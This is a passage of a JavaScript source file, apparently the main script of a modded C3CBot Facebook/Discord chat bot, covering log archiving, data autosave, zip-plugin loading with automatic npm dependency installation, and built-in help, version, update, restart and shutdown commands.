/* eslint-disable consistent-this */
/* eslint-disable no-loop-func */
/* eslint-disable require-atomic-updates */
/* eslint-disable class-methods-use-this */
/* eslint-disable no-process-env */

require("./ClassModifier.js");
var _sizeObject = function (object) {
  return Object.keys(object)
    .length;
};
global.nodemodule = {};
var os = require("os");
var FormData = require('form-data');
const fs = require('fs');
var path = require("path");
var syncrequest = require('sync-request');
var wait = require('wait-for-stuff');
var semver = require("semver");
var childProcess = require("child_process");
var streamBuffers = require("stream-buffers");
//var url = require("url");
//var net = require('net');
var zlib = require("zlib");
var tar = require("tar-stream");
const readline = require('readline');
var speakeasy = require("speakeasy"); //2FA
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
  terminal: true,
  prompt: ""
});
global.crl = rl;
var fetch = require("node-fetch");
var _checkPort = require("./checkPort.js");
var CPULoad = require("./CPULoad.js");
////var querystring = require('querystring');
////var delay = require('delay');
const StreamZip = require('node-stream-zip');
////var tf = require("@tensorflow/tfjs");
global.sshcurrsession = {};
global.sshstream = {};

//Adding FFMPEG to PATH
let fStatic = require("ffmpeg-static");
let ffmpegExecPath = path.dirname(fStatic);
if (os.platform() == "win32") {
  process.env.PATH += ";" + ffmpegExecPath;
} else {
  process.env.PATH += ":" + ffmpegExecPath;
}

global.reload = () => {
  unloadPlugin();
  loadPlugin();
};
global.fbchat = (id, mess) => {
  if (global.getType(facebook.api) === "Object") {
    var isGroup = (id.toString().length == 16);
    facebook.api.sendMessage(mess, id, () => { }, null, isGroup);
    return `Sent message: ${mess} to ${isGroup ? "Thread" : "User"} ID ${id}`;
  } else {
    return "Error: Account not logged in!";
  }
};
global.restart = () => {
  setTimeout(function () {
    process.exit(7378278);
  }, 1000);
  return "Restarting...";
};

/**
 * Find every file in a directory
 *
 * @param   {string}    startPath        A path specify where to start.
 * @param   {RegExp}    filter           Regex to filter results.
 * @param   {boolean}   arrayOutput      Options: Output array or send to callback?
 * @param   {boolean}   recursive        Options: Recursive or not?
 * @param   {function}  [callback]       Callback function.
 *
 * @return  {(Array<String>|undefined)}  An array contains path of every files match regex.
 */
function findFromDir(startPath, filter, arrayOutput, recursive, callback) {
  var nocallback = false;
  if (!callback) {
    callback = function () { };
    nocallback = true;
  }
  if (!fs.existsSync(startPath)) {
    throw "No such directory: " + startPath;
  }
  var files = fs.readdirSync(startPath);
  var arrayFile = [];
  for (var i = 0; i < files.length; i++) {
    var filename = path.join(startPath, files[i]);
    var stat = fs.lstatSync(filename);
    if (stat.isDirectory() && recursive) {
      var arrdata = findFromDir(filename, filter, true, true);
      if (!nocallback && !arrayOutput) {
        for (var n in arrdata) {
          callback(path.join(filename, arrdata[n]));
        }
      } else {
        arrayFile = arrayFile.concat(arrdata);
      }
    } else {
      if (!arrayOutput && !nocallback) {
        if (filter.test(filename)) callback(filename);
      } else {
        if (filter.test(filename)) arrayFile[arrayFile.length] = filename;
      }
    }
  }
  if (arrayOutput && !nocallback) {
    callback(arrayFile);
  } else if (arrayOutput) {
    return arrayFile;
  }
}
/**
 * Ensure <path> exists.
 *
 * @param   {string}  path  Path
 * @param   {number}  mask  Folder's mask
 *
 * @return  {object}        Error or nothing.
 */
function ensureExists(path, mask) {
  if (typeof mask != 'number') {
    mask = 0o777;
  }
  try {
    fs.mkdirSync(path, {
      mode: mask,
      recursive: true
    });
    return;
  } catch (ex) {
    return {
      err: ex
    };
  }
}
ensureExists(path.join(__dirname, "logs"));
var logFileList = findFromDir(path.join(__dirname, "logs"), /.*\.log$/, true, true);
logFileList.forEach(dir => {
  var newdir = path.join(__dirname, "logs", path.parse(dir)
    .name + ".tar.gz");
  var file = fs.readFileSync(dir);
  var pack = tar.pack();
  pack.entry({
    name: path.parse(dir)
      .name + ".log"
  }, file);
  pack.finalize();
  var tardata = Buffer.alloc(0);
  pack.on("data", chunk => {
    tardata = Buffer.concat([tardata, chunk]);
  })
    .on("end", () => {
      zlib.gzip(tardata, (err, data) => {
        if (err) throw err;
        fs.writeFileSync(newdir, data, {
          mode: 0o666
        });
        fs.unlinkSync(dir);
      });
    });
});

var log = require("./logger.js");

//Capturing STDERR
var _stderrold = process.stderr.write;
global.stderrdata = "";
process.stderr.write = function (chunk, encoding, callback) {
  global.stderrdata += chunk;
  if (typeof callback == "function") {
    callback();
  }
};
setInterval(() => {
  if (global.stderrdata != "" && global.stderrdata.indexOf("Hi there 👋. Looks like you are running TensorFlow.js in Node.js. To speed things up dramatically, install our node backend, which binds to TensorFlow C++, by running npm i @tensorflow/tfjs-node, or npm i @tensorflow/tfjs-node-gpu if you have CUDA. Then call require('@tensorflow/tfjs-node'); (-gpu suffix for CUDA) at the start of your program. Visit https://github.com/tensorflow/tfjs-node for more details.") == -1) {
    var arr = global.stderrdata.split(/[\r\n]|\r|\n/g)
      .filter((val) => val != "");
    arr.splice(arr.length - 1, 1);
    for (var n in arr) {
      log("[STDERR]", arr[n]);
    }
  }
  global.stderrdata = "";
}, 200);

//Handling rejected promise that are unhandled
process.on('unhandledRejection', (reason, promise) => {
  log("[INTERNAL]", 'Warning: Rejected promise: ', promise, ', reason:', reason);
});
//Handling uncaught exception (without try/catch, usually in callback)
//! DEFINELY NOT SAFE AT ALL, BUT STILL ADDING IT.
process.on('uncaughtException', (err, origin) => {
  log("[INTERNAL]", `Warning: ${origin}:`, err);
});

var autoUpdater = require("./autoUpdater.js");
var cUpdate = autoUpdater.checkForUpdate();

log("Starting C3CBot version : 0.6.0");
log("This is a mod version by JustGon. Do not steal!")

global.config = require("./getConfig.js")();

var testmode = global.config.testmode;
var prefix = "";

var availableLangFile = findFromDir(path.join(__dirname, "lang"), /.*\.yml$/, true, false);
var langMap = {};
var yamlParser = require('js-yaml');
availableLangFile.forEach(v => {
  var lang = path.parse(v);
  log("[INTERNAL]", "Loading language:", lang.name);
  var ymlData = fs.readFileSync(v, { encoding: "utf8" });
  langMap[lang.name] = yamlParser.load(ymlData);
});
var getLang = function (langVal, id, oLang) {
  var lang = global.config.language;
  if (id && global.data.userLanguage[id]) {
    lang = global.data.userLanguage[id];
    if (!langMap[lang]) {
      log("[INTERNAL]", "Warning: Invalid language: ", lang, `; using ${global.config.language} as fallback...`);
      lang = global.config.language;
    }
  }
  if (oLang) {
    lang = oLang;
    if (!langMap[lang]) {
      log("[INTERNAL]", "Warning: Invalid language: ", lang, `; using ${global.config.language} as fallback...`);
      lang = global.config.language;
    }
  }

  if (langMap[lang]) {
    return String(langMap[lang][langVal]);
  } else {
    log("[INTERNAL]", "Warning: Invalid language: ", lang, "; using en_US as fallback...");
    return String((langMap["en_US"] || {})[langVal]);
  }
};

/**
 * Resolves data received from base and return formatted UserID.
 *
 * @param   {string}  type  Platform name
 * @param   {string}  data  Data to be resolved by plugins
 *
 * @return  {string}        Formatted UserID
 */
var resolveID = function (type, data) {
  switch (type) {
    case "Facebook":
      return "FB-" + data.msgdata.senderID || data.msgdata.author;
    case "Discord":
      return "DC-" + data.msgdata.author.id;
    default:
      return "";
  }
};

if (global.config.facebookProxyUseSOCKS) {
  var ProxyServer = require("./SOCK2HTTP.js")(log);
  var fS2HResolve = function () { };
  var S2HPromise = new Promise(resolve => {
    fS2HResolve = resolve;
  });
  var localSocksProxy = new ProxyServer({
    socks: global.config.facebookProxy
  })
    .listen(global.config.portSOCK2HTTP, global.config.addressSOCK2HTTP || "0.0.0.0")
    .on("listening", () => {
      log("[SOCK2HTTP]", `Listening at ${localSocksProxy.address().address}:${localSocksProxy.address().port}`);
      fS2HResolve({
        address: localSocksProxy.address()
          .address,
        port: localSocksProxy.address()
          .port
      });
    })
    .on("error", err => {
      log("[SOCK2HTTP]", err);
    });
  var S2HResponse = wait.for.promise(S2HPromise);
  var sock2httpPort = S2HResponse.port;
  var sock2httpAddress = S2HResponse.address;
}

/**
 * Get a randomized number
 *
 * @param  {number} min Minimum
 * @param  {number} max Maximum
 * 
 * @returns {number} A randomized number.
 */
var random = function (min, max) {
  if (min > max) {
    var temp = min;
    min = max;
    max = temp;
  }
  var bnum = (max - min)
    .toString(16)
    .length / 2;
  if (bnum < 1) bnum = 1;
  return Math.round(parseInt(crypto.randomBytes(bnum)
    .toString('hex'), 16) / Math.pow(16, bnum * 2) * (max - min)) + min;
};
/**
 * Get some random bytes
 *
 * @param  {number} numbytes Number of bytes.
 * @returns {string} Random bytes.
 */
var _randomBytes = function (numbytes) {
  numbytes = numbytes || 1;
  return crypto.randomBytes(numbytes)
    .toString('hex');
};
//Cryptography
var crypto = require('crypto');

/**
 * Get a HMAC hash.
 *
 * @param   {string}  publick            Public key
 * @param   {string}  privatek           Private key
 * @param   {string}  [algo=sha512]      Algrorithim
 * @param   {string}  [output=hex]       Output type
 *
 * @return  {string}                     HMAC hash
 */
function _HMAC(publick, privatek, algo, output) {
  algo = algo || "sha512";
  output = output || "hex";
  var hmac = crypto.createHmac(algo, privatek);
  hmac.update(publick);
  var value = hmac.digest(output);
  return value;
}

//* Load data
if (testmode) {
  fs.existsSync(path.join(__dirname, "data-test.json")) ? global.data = JSON.parse(fs.readFileSync(path.join(
    __dirname,
    "data-test.json"
  ))) : (function () {
    log("[INTERNAL]", "OwO, data file not found.");
    global.data = {};
  })();
} else {
  fs.existsSync(path.join(__dirname, "data.json")) ? global.data = JSON.parse(fs.readFileSync(path.join(
    __dirname,
    "data.json"
  ))) : (function () {
    log("[INTERNAL]", "OwO, data file not found.");
    global.data = {};
  })();
}
global.dataBackup = JSON.parse(JSON.stringify(global.data));
//*Auto-save global data clock
global.isDataSaving = false;
global.dataSavingTimes = 0;
var autosave = setInterval(function (testmode, log) {
  if ((!global.isDataSaving || global.dataSavingTimes > 3) && JSON.stringify(global.data) !== JSON.stringify(global
    .dataBackup)) {
    if (global.dataSavingTimes > 3) {
      log("[INTERNAL]", "Auto-save clock is executing over 30 seconds! (", global.dataSavingTimes, ")");
    }
    global.isDataSaving = true;
    try {
      if (testmode) {
        fs.writeFileSync(path.join(__dirname, "data-test-temp.json"), JSON.stringify(global.data, null, 4), {
          mode: 0o666
        });
        fs.renameSync(path.join(__dirname, "data-test-temp.json"), path.join(__dirname, "data-test.json"));
      } else {
        fs.writeFileSync(path.join(__dirname, "data-temp.json"), JSON.stringify(global.data, null, 4), {
          mode: 0o666
        });
        fs.renameSync(path.join(__dirname, "data-temp.json"), path.join(__dirname, "data.json"));
      }
    } catch (err) {
      log("[INTERNAL]", "Auto-save encounted an error:", err);
    }
    global.isDataSaving = false;
    global.dataSavingTimes = 0;
    global.dataBackup = JSON.parse(JSON.stringify(global.data));
  } else {
    if (JSON.stringify(global.data) != JSON.stringify(global.dataBackup)) {
      global.dataSavingTimes++;
    }
  }
}, 10000, testmode, log);

var currentCPUPercentage = 0;
global.currentCPUPercentage = 0;
var _titleClocking = setInterval(async () => {
  var titleescape1 = String.fromCharCode(27) + ']0;';
  var titleescape2 = String.fromCharCode(7);
  currentCPUPercentage = await (new CPULoad(1000));
  global.currentCPUPercentage = currentCPUPercentage;
  var title = global.config.botname + " v" + "0.6.0" + " | " + (currentCPUPercentage * 100)
    .toFixed(0) + "% CPU" + " | " + ((os.totalmem() - os.freemem()) / 1024 / 1024)
      .toFixed(0) + " MB" + "/" + (os.totalmem() / 1024 / 1024)
        .toFixed(0) + " MB RAM" + " | BOT: " + (process.memoryUsage()
          .rss / 1024 / 1024)
          .toFixed(0) + " MB USED";
  process.title = title;
  if (global.sshcurrsession) {
    if (typeof global.sshcurrsession == "object") {
      for (var session in global.sshstream) {
        try {
          global.sshstream[session].stdout.write(titleescape1 + title + titleescape2);
        } catch (ex) { }
      }
    }
  }
}, 3000);
/**
 * "require" with data as string
 *
 * @param   {string}  src       Source code
 * @param   {string}  filename  File name
 *
 * @return  {any}               module.exports of source code
 */
function requireFromString(src, filename) {
  var Module = module.constructor;
  var m = new Module();
  m._compile(src, filename);
  return m.exports;
}

//Auto updater
function checkUpdate(silent, cUpdate) {
  var newUpdate = cUpdate || autoUpdater.checkForUpdate();
  if (!silent || newUpdate.newUpdate) {
    log(
      "[Updater]",
      `You are using build 0.6.0 there are no new build.`
    );
  }
}

checkUpdate(false, cUpdate);

if (global.config.autoUpdateTimer > 0 && global.config.autoUpdate) {
  setInterval(checkUpdate, global.config.autoUpdateTimer * 60 * 1000, true);
}

//Plugin Load
ensureExists(path.join(__dirname, "plugins"));
ensureExists(path.join(__dirname, "plugins", "nodemodules"));

function checkPluginCompatibly(version) {
  version = version.toString();
  try {
    //* Plugin complied with version 0.3.0 => 0.3.14 and 0.4.0 and 0.5.0 is allowed
    var allowedVersion = "0.3.0 - 0.3.14 || 0.4.0 || 0.5.0";
    return semver.intersects(semver.clean(version), allowedVersion);
  } catch (ex) {
    return false;
  }
}


async function loadPlugin() {
  let startLoading = Date.now();

  var error = [];
  global.plugins = {}; //Plugin Scope
  var pltemp1 = {}; //Plugin Info
  var pltemp2 = {}; //Plugin Executable
  global.fileMap = {};
  global.privateFileMap = {};
  global.loadedPlugins = {};
  global.chatHook = [];
  !global.commandMapping ? global.commandMapping = {} : "";
  log("[INTERNAL]", "Searching for plugins in ./plugins/ ...");
  var pluginFileList = findFromDir(path.join(__dirname, "plugins/"), /.*\.(z3p|zip)$/, true, false);
  for (var n in pluginFileList) {
    let zip = null;
    try {
      zip = new StreamZip({
        file: pluginFileList[n],
        storeEntries: true
      });
      wait.for.event(zip, "ready");
      try {
        var plinfo = JSON.parse(zip.entryDataSync('plugins.json')
          .toString('utf8'));
      } catch (ex) {
        throw "Invalid plugins.json file (Broken JSON)!";
      }
      if (!plinfo["plugin_name"] || !plinfo["plugin_scope"] || !plinfo["plugin_exec"]) {
        throw "Invalid plugins.json file (Not enough data)!";
      }
      if (!plinfo["complied_for"]) {
        throw "Plugin doesn't have complied_for (Complied for <=0.2.8?).";
      } else {
        if (!checkPluginCompatibly(plinfo["complied_for"])) {
          throw "Plugin is complied for version {0}, but this version doesn't compatible with it.".replace(
            "{0}",
            plinfo["complied_for"]
          );
        }
      }
      try {
        var plexec = zip.entryDataSync(plinfo["plugin_exec"])
          .toString('utf8');
      } catch (ex) {
        throw "Executable file " + plinfo["plugin_exec"] + " not found.";
      }

      if (global.getType(plinfo["file_map"]) == "Object") {
        for (let fd in plinfo["file_map"]) {
          try {
            global.fileMap[plinfo["file_map"][fd]] = zip.entryDataSync(fd);
          } catch (ex) {
            throw "File " + fd + " not found.";
          }
        }
      }
      if (global.getType(plinfo["private_file_map"]) == "Object") {
        global.privateFileMap[plinfo["plugin_scope"]] = {};
        for (let fd in plinfo["private_file_map"]) {
          try {
            global.privateFileMap[plinfo["plugin_scope"]][plinfo["private_file_map"][fd]] = zip.entryDataSync(fd);
          } catch (ex) {
            throw "File " + fd + " not found.";
          }
        }
      }

      if (typeof plinfo["node_depends"] == "object") {
        for (var nid in plinfo["node_depends"]) {
          var defaultmodule = require("module")
            .builtinModules;
          var moduledir = path.join(__dirname, "plugins", "nodemodules", "node_modules", nid);
          try {
            if (defaultmodule.indexOf(nid) != -1 || (["jimp", "wait-for-stuff", "deasync", "discord.js", "fca-unofficial", "ffmpeg-static"]).indexOf(nid) !== -1) {
              global.nodemodule[nid] = require(nid);
            } else {
              global.nodemodule[nid] = require(moduledir);
            }
          } catch (ex) {
            log(
              "[INTERNAL]", pluginFileList[n], "is requiring node modules named", nid,
              "but it isn't installed. Attempting to install it through npm package manager..."
            );
            childProcess.execSync(
              "npm --loglevel error --package-lock false --save false -- install " + nid +
              (
                plinfo["node_depends"][nid] == "*" ||
                  plinfo["node_depends"][nid] == "" ? "" : ("@" + plinfo["node_depends"][nid])
              ),
              {
                stdio: "inherit",
                cwd: path.join(__dirname, "plugins", "nodemodules"),
                env: process.env,
                shell: true
              }
            );
            //Loading 3 more times before drop that plugins
            var moduleLoadTime = 0;
            var exception = "";
            var success = false;
            for (moduleLoadTime = 1; moduleLoadTime <= 3; moduleLoadTime++) {
              require.cache = {};
              try {
                if (defaultmodule.indexOf(nid) != -1 || nid == "jimp") {
                  global.nodemodule[nid] = require(nid);
                } else {
                  global.nodemodule[nid] = require(moduledir);
                }
                success = true;
                break;
              } catch (ex) {
                exception = ex;
              }
              if (success) {
                break;
              }
            }
            if (!success) {
              throw "Cannot load node module: " + nid + ". Additional info: " + exception;
            }
          }
        }
      }
      pltemp1[plinfo["plugin_name"]] = plinfo;
      pltemp1[plinfo["plugin_name"]].filename = pluginFileList[n];
      pltemp2[plinfo["plugin_name"]] = plexec;
      zip.close();
    } catch (ex) {
      log("[INTERNAL]", "Error while loading plugin at \"" + pluginFileList[n] + "\":", ex);
      error.push(pluginFileList[n]);
      delete pltemp1[plinfo["plugin_name"]];
      delete pltemp2[plinfo["plugin_name"]];
      if (zip) {
        zip.close();
      }
    }
  }
  for (var plname in pltemp1) {
    var passed = true;
    if (pltemp1[plname]["dependents"]) {
      for (var no in pltemp1[plname]["dependents"]) {
        if (typeof pltemp1[pltemp1[plname]["dependents"][no]] != "object") {
          passed = false;
          log("[INTERNAL]", plname, "depend on plugin named", pltemp1[plname][
            "dependents"][no] + ", but that plugin is not installed/loaded.");
        }
      }
    }
    if (passed) {
      try {
        global.plugins[pltemp1[plname]["plugin_scope"]] = requireFromString(pltemp2[plname], path.join(pltemp1[plname].filename, pltemp1[plname]["plugin_exec"]));
        if (typeof global.plugins[pltemp1[plname]["plugin_scope"]].onLoad == "function") {
          await (async function (plname) {
            let ret = global.plugins[pltemp1[plname]["plugin_scope"]].onLoad({
              // eslint-disable-next-line no-loop-func
              log: function logPlugin(...message) {
                log.apply(global, [
                  "[PLUGIN]",
                  "[" + plname + "]"
                ].concat(message));
              }
            });

            if (global.getType(ret) == "Promise") {
              ret = await ret;
            }

            if (global.getType(ret) == "Object") {
              pltemp1[plname]["command_map"] = {
                ...pltemp1[plname]["command_map"],
                ...ret
              };
            }
          })(String(plname));
        }
        for (var cmd in pltemp1[plname]["command_map"]) {
          var cmdo = pltemp1[plname]["command_map"][cmd];
          if (!cmdo["hdesc"] || !cmdo["fscope"] || isNaN(parseInt(cmdo["compatibly"]))) {
            log("[INTERNAL]", plname, "has a command that isn't have enough information to define (/" + cmd + ")");
          } else if (
            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][cmdo.fscope]) != "Function" &&
            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][cmdo.fscope]) != "AsyncFunction"
          ) {
            log("[INTERNAL]", plname, "is missing a function for /" + cmd);
          } else {
            var oldstr;
            if (typeof cmdo.hdesc != "object") {
              oldstr = cmdo.hdesc;
              cmdo.hdesc = {};
              cmdo.hdesc[global.config.language] = oldstr;
            }
            if (cmdo.hargs) {
              if (typeof cmdo.hargs != "object") {
                oldstr = cmdo.hargs;
                cmdo.hargs = {};
                cmdo.hargs[global.config.language] = oldstr;
              }
            } else {
              cmdo.hargs = {};
              cmdo.hargs[global.config.language] = "";
            }
            global.commandMapping[cmd] = {
              args: cmdo.hargs,
              desc: cmdo.hdesc,
              scope: global.plugins[pltemp1[plname]["plugin_scope"]][cmdo
                .fscope],
              compatibly: parseInt(cmdo.compatibly),
              handler: plname
            };
            if (Object.prototype.hasOwnProperty.call(cmdo, "adminCmd")) {
              global.commandMapping[cmd].adminCmd = true;
            }
          }
        }
        if (typeof pltemp1[plname]["chatHook"] == "string" &&
          typeof pltemp1[plname]["chatHookType"] == "string" &&
          !isNaN(parseInt(pltemp1[plname]["chatHookPlatform"])) &&
          (
            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]]) == "Function" ||
            global.getType(global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]]) == "AsyncFunction"
          )) {
          global.chatHook.push({
            resolverFunc: global.plugins[pltemp1[plname]["plugin_scope"]][pltemp1[plname]["chatHook"]],
            listentype: pltemp1[plname]["chatHookType"],
            listenplatform: parseInt(pltemp1[plname]["chatHookPlatform"]),
            handler: plname
          });
        }
        global.loadedPlugins[plname] = {
          author: pltemp1[plname].author,
          version: pltemp1[plname].version,
          onUnload: global.plugins[pltemp1[plname]["plugin_scope"]].onUnload
        };
        log("[INTERNAL]", "Loaded", plname, pltemp1[plname].version, "by", pltemp1[plname].author);
      } catch (ex) {
        log(
          "[INTERNAL]", plname,
          "contains an malformed executable code and cannot be loaded. Plugin depend on this code may not work correctly. Additional information:",
          ex
        );
        error.push(pltemp1[plname].filename);
      }
    }
  }
  global.commandMapping["systeminfo"] = {
    args: {},
    desc: "Show system info",
    scope: function () {
      var uptime = os.uptime();
      var utdate = new Date(uptime);
      return {
        handler: "internal",
        data: `System info:\r\n- CPU arch: ${os.arch()}\r\n- OS type: ${os.type()} (Platform: ${os.platform()})\r\n- OS version: ${os.release()}\r\n- Uptime: ${(uptime / 3600 / 24).floor(0).pad(2)}:${utdate.getUTCHours().pad(2)}:${utdate.getUTCMinutes().pad(2)}:${utdate.getUTCSeconds().pad(2)}\r\n- Total memory: ${os.totalmem() / 1048576} MB\r\n- Heroku: ${(!!process.env.PORT).toString()}`
      };
    },
    compatibly: 0,
    handler: "INTERNAL"
  };
  global.commandMapping["updatebot"] = {
    args: {},
    desc: {},
    scope: function (type, data) {
      if (data.admin) {
        var newUpdate = autoUpdater.checkForUpdate();
        log(
          "[Updater]",
          `You are using build ${newUpdate.currVersion}, and ${newUpdate.newUpdate ? "there is a new build (" + newUpdate.version + ")" : "there are no new build."}`
        );
        data.return({
          data: `Current build: ${newUpdate.currVersion}\r\nLatest build: ${newUpdate.version}.${newUpdate.newUpdate ? "\r\nUpdating..." : ""}`,
          handler: "internal"
        });
        if (newUpdate.newUpdate) {
          log("[Updater]", `Downloading build ${newUpdate.version}...`);
          autoUpdater.installUpdate()
            .then(function (ret) {
              var [success, value] = ret;
              if (success) {
                log("[Updater]", `Updated with ${value} entries extracted. Triggering restart...`);
                data.return({
                  handler: "internal",
                  data: "Extracted files. Restarting..."
                });
                setTimeout(() => process.exit(7378278), 1000);
              } else {
                log("[Updater]", "Failed to install new build:", value);
                data.return({
                  handler: "internal",
                  data: "Failed to install new build: " + value
                });
              }
            })
            .catch(function (ex) {
              log("[Updater]", "Failed to install new build:", ex);
              data.return({
                handler: "internal",
                data: "Failed to install new build: " + ex
              });
            });
        }
      } else {
        return {
          handler: "internal",
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: true
  };
  global.commandMapping["version"] = {
    args: {},
    desc: {},
    scope: function (_type, _data) {
      var githubdata = JSON.parse(syncrequest("GET", "https://api.github.com/repos/c3cbot/c3c-0x/git/refs/tags", {
        headers: {
          "User-Agent": global.config.fbuseragent
        }
      })
        .body.toString());
      var latestrelease = githubdata[githubdata.length - 1];
      var latestgithubversion = latestrelease.ref.replace("refs/tags/", "");
      var codedata = JSON.parse(syncrequest(
        "GET",
        "https://raw.githubusercontent.com/c3cbot/c3c-0x/master/package.json", {
        headers: {
          "User-Agent": global.config.fbuseragent
        }
      }
      )
        .body.toString());
      var latestcodeversion = codedata.version;
      return {
        handler: "internal",
        data: "Currently running on version " + version + "\r\nLatest GitHub version: " + latestgithubversion +
          "\r\nLatest code version: " + latestcodeversion
      };
    },
    compatibly: 0,
    handler: "INTERNAL"
  };
  global.commandMapping["version"].args[global.config.language] = "";
  global.commandMapping["version"].desc[global.config.language] = getLang("VERSION_DESC");
  global.commandMapping["help"] = {
    args: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["HELP_ARGS"]])),
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["HELP_DESC"]])),
    scope: function (type, data) {
      let ul = global.data.userLanguage[resolveID(type, data)] || global.config.language;
      if (isNaN(parseInt(data.args[1])) && data.args.length != 1) {
        var cmd = data.args[1];
        if (Object.prototype.hasOwnProperty.call(global.commandMapping, cmd)) {
          var mts = global.config.commandPrefix + cmd;
          if (typeof global.commandMapping[cmd].args == "object") {
            let ha = global.commandMapping[cmd].args;
            if (typeof ha[ul] == "string") {
              ha = ha[ul];
            } else {
              ha = ha[global.config.language];
              typeof ha == "undefined" ? ha = "" : "";
            }
            if (ha.replace(/ /g).length != 0) {
              mts += ` ${ha}`;
            }
          }
          mts += "\r\n" + global.commandMapping[cmd].desc[ul] || global.commandMapping[cmd].desc[global.config.language];
          mts += "\r\n" + getLang("HELP_ARG_INFO", resolveID(type, data));
          return {
            handler: "internal",
            data: mts
          };
        } else {
          return {
            handler: "internal",
            data: global.config.commandPrefix + cmd + "\r\n" + getLang("HELP_CMD_NOT_FOUND", resolveID(type, data))
          };
        }
      } else {
        var page = 1;
        page = parseInt(data.args[1]) || 1;
        if (page < 1) page = 1;
        let mts = "";
        mts += getLang("HELP_OUTPUT_PREFIX", resolveID(type, data));
        var helpobj = global.commandMapping["help"];
        helpobj.command = "help";
        helpobj.args[ul] = getLang("HELP_ARGS", resolveID(type, data));
        helpobj.desc[ul] = getLang("HELP_DESC", resolveID(type, data));
        var hl = [helpobj];
        for (var no in global.commandMapping) {
          if (no !== "help") {
            var tempx = global.commandMapping[no];
            tempx.command = no;
            hl.push(tempx);
          }
        }
        if (type == "Discord") {
          mts += "\r\n```HTTP";
        }
        var compatiblyFlag = 0;
        switch (type) {
          case "Facebook":
            compatiblyFlag = 1;
            break;
          case "Discord":
            compatiblyFlag = 2;
            break;
        }
        for (var i = 15 * (page - 1); i < 15 * (page - 1) + 15; i++) {
          if (i < hl.length) {
            if (hl[i].compatibly == 0 || (hl[i].compatibly & compatiblyFlag)) {
              if (data.admin) {
                mts += `\n${i + 1}. ${global.config.commandPrefix}${hl[i].command}`;
                if (typeof hl[i].args == "object") {
                  let ha = hl[i].args;
                  if (typeof ha[ul] == "string") {
                    ha = ha[ul];
                  } else {
                    ha = ha[global.config.language];
                    typeof ha == "undefined" ? ha = "" : "";
                  }
                  if (ha.replace(/ /g).length != 0) {
                    mts += ` ${ha}`;
                  }
                } else if (typeof hl[i].args == "string") {
                  mts += ` ${hl[i].args}`;
                }
              } else if (!hl[i].adminCmd) {
                mts += `\n${i + 1}. ${global.config.commandPrefix}${hl[i].command}`;
                if (typeof hl[i].args == "object") {
                  let ha = hl[i].args;
                  if (typeof ha[ul] == "string") {
                    ha = ha[ul];
                  } else {
                    ha = ha[global.config.language];
                    typeof ha == "undefined" ? ha = "" : "";
                  }
                  if (ha.replace(/ /g).length != 0) {
                    mts += ` ${ha}`;
                  }
                }
              }
            }
          }
        }
        if (type == "Discord") {
          mts += "\n```";
        }

        var info1234 = require("./maybeyoudonotknow/youknow.json")
        var info12345 = ["​"]
        mts += `\n(${getLang("PAGE", resolveID(type, data))} ${page}/${(hl.length / 15).ceil()})`;
        mts += `\n${getLang("HELP_MORE_INFO", resolveID(type, data)).replace("{0}", global.config.commandPrefix)}`;
        mts += `\n${info12345[Math.floor(Math.random() * info12345.length)]}`;
        mts += `\n${"[Bạn có biết ?] : "+info1234[Math.floor(Math.random() * info1234.length)]}`;
        return {
          handler: "internal",
          data: mts
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL"
  };

  global.commandMapping["restart"] = {
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["RESTART_DESC"]])),
    scope: function (type, data) {
      if (data.admin && global.config.allowAdminUseRestartCommand) {
        setTimeout(function () {
          process.exit(7378278);
        }, 1000);
        return {
          handler: "internal",
          data: "Restarting..."
        };
      } else {
        return {
          handler: "internal",
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: true
  };

  global.commandMapping["shutdown"] = {
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["SHUTDOWN_DESC"]])),
    scope: function (type, data) {
      if (data.admin && global.config.allowAdminUseShutdownCommand) {
        setTimeout(function () {
          process.exit(74883696);
        }, 1000);
        return {
          handler: "internal",
          data: "Shutting down..."
        };
      } else {
        return {
          handler: "internal",
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
        };
      }
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: true
  };

  global.commandMapping["plugins"] = {
    args: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["HELP_ARGS"]])),
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["PLUGINS_DESC"]])),
    scope: function (type, data) {
      if (!data.admin && !global.config.allowUserUsePluginsCommand) {
        return {
          handler: "internal",
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
        };
      }
      var page = 1;
      page = parseInt(data.args[1]) || 1;
      if (page < 1) page = 1;
      var mts = "";
      mts += getLang("PLUGINS_OUTPUT_PREFIX", resolveID(type, data));
      var hl = [];
      for (var no in global.loadedPlugins) {
        var tempx = global.loadedPlugins[no];
        tempx.name = no;
        hl.push(tempx);
      }
      if (type == "Discord") {
        mts += "\r\n```HTTP";
      }
      for (var i = 5 * (page - 1); i < 5 * (page - 1) + 5; i++) {
        if (i < hl.length) {
          mts += "\r\n" + (i + 1)
            .toString() + ". " + hl[i].name;
          if (!!hl[i].version && hl[i].version != "") {
            mts += " " + hl[i].version;
          }
          mts += " by " + hl[i].author;
        }
      }
      if (type == "Discord") {
        mts += "\r\n```";
      }
      mts += '\r\n(Page ' + page + '/' + (hl.length / 5)
        .ceil() + ')';
      return {
        handler: "internal",
        data: mts
      };
    },
    compatibly: 0,
    handler: "INTERNAL",
    adminCmd: !global.config.allowUserUsePluginsCommand
  };

  global.commandMapping["reload"] = {
    args: {},
    desc: Object.fromEntries(Object.entries(langMap).map(x => [x[0], x[1]["RELOAD_DESC"]])),
    scope: async function (type, data) {
      if (!data.admin && !global.config.allowUserUseReloadCommand) {
        return {
          handler: "internal",
          data: getLang("INSUFFICIENT_PERM", resolveID(type, data))
        };
